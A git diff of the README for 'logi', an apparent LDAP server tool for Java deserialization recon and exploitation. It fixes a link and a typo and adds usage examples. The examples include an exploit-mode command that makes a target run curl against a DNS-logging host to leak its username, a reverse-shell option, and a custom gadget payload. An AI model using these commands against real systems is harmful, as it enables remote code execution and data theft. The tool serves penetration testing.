@@ -10,7 +10,7 @@ Logi is a ldap server focusing on ldap deserialize recon and exploit.
   - [💻See also](#see-also)
 
 ## ✨Get started
-Download logi from release, or use `go install`
+Download logi from [release](https://github.com/cokeBeer/logi/releases), or use `go install`
 ```
 go install github.com/cokeBeer/logi/cmd/logi@latest
 ```
@@ -55,11 +55,15 @@ One class name per line.
 ```
 Run exploit mode with gadget `cb1v18`  with command `curl ${whoami}.dnslog.me`
 ```
-./logi -m 3 -g cb1v18 -c 'curl ${whoami}.dnslog.i'
+./logi -m 3 -g cb1v18 -c 'curl ${whoami}.dnslog.me'
 ```
 Run exploit mode with gadget `cb1v18` with reverse shell to `127.0.0.1:7777`
 ```
 ./logi -m 3 -g cb1v18 -s '127.0.0.1:7777'
+```
+Run exploit mode with custom binary payload in `./cc1`
+```
+./logi -m 3 -b ./cc1
 ```
 ## 🔮Image
 ![image](image/logi.png)
